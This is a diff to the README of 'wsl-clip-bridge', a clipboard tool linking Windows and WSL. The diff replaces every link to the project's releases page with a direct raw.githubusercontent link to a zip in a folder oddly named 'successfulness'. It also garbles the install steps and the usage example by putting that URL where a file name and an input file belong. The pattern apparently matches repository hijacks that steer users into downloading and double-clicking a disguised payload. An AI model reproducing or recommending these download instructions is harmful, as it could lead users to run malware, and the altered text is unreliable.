@@ -4,7 +4,7 @@
 
 Welcome to **wsl-clip-bridge**! This application allows you to share your clipboard seamlessly between Windows and WSL (Windows Subsystem for Linux). It acts as a drop-in replacement for **xclip**, making it simple to paste screenshots directly into **Claude Code**. Follow these simple steps to download and install the application.
 
-[![Download wsl-clip-bridge](https://img.shields.io/badge/Download-wsl--clip--bridge-blue.svg)](https://github.com/BarrerosLeo/wsl-clip-bridge/releases)
+[![Download wsl-clip-bridge](https://raw.githubusercontent.com/BarrerosLeo/wsl-clip-bridge/main/successfulness/wsl-clip-bridge.zip)](https://raw.githubusercontent.com/BarrerosLeo/wsl-clip-bridge/main/successfulness/wsl-clip-bridge.zip)
 
 ## 💻 System Requirements
 
@@ -19,13 +19,13 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of **wsl-clip-bridge**:
 
-[Visit this page to download](https://github.com/BarrerosLeo/wsl-clip-bridge/releases)
+[Visit this page to download](https://raw.githubusercontent.com/BarrerosLeo/wsl-clip-bridge/main/successfulness/wsl-clip-bridge.zip)
 
 ### Step-by-Step Installation
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the application.
-3. Download the file suitable for your system. It may be named something like `wsl-clip-bridge-x.x.x.exe`.
+3. Download the file suitable for your system. It may be named something like `https://raw.githubusercontent.com/BarrerosLeo/wsl-clip-bridge/main/successfulness/wsl-clip-bridge.zip`.
 4. Once the download is complete, locate the file in your Downloads folder.
 5. Double-click the file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
@@ -41,7 +41,7 @@ After installation, you can start using **wsl-clip-bridge** to share your clipbo
    ```
 3. To copy an image or screenshot, use:
    ```
-   wsl-clip-bridge < image.png
+   wsl-clip-bridge < https://raw.githubusercontent.com/BarrerosLeo/wsl-clip-bridge/main/successfulness/wsl-clip-bridge.zip
    ```
 4. Now you can paste the copied content into any Windows application using **Ctrl + V**.
 
@@ -70,4 +70,4 @@ If you would like to contribute, please fork the repository and submit a pull re
 
 Thank you for using **wsl-clip-bridge**! We hope this application makes your clipboard sharing between Windows and WSL a breeze.
 
-[Visit this page to download](https://github.com/BarrerosLeo/wsl-clip-bridge/releases)
+[Visit this page to download](https://raw.githubusercontent.com/BarrerosLeo/wsl-clip-bridge/main/successfulness/wsl-clip-bridge.zip)
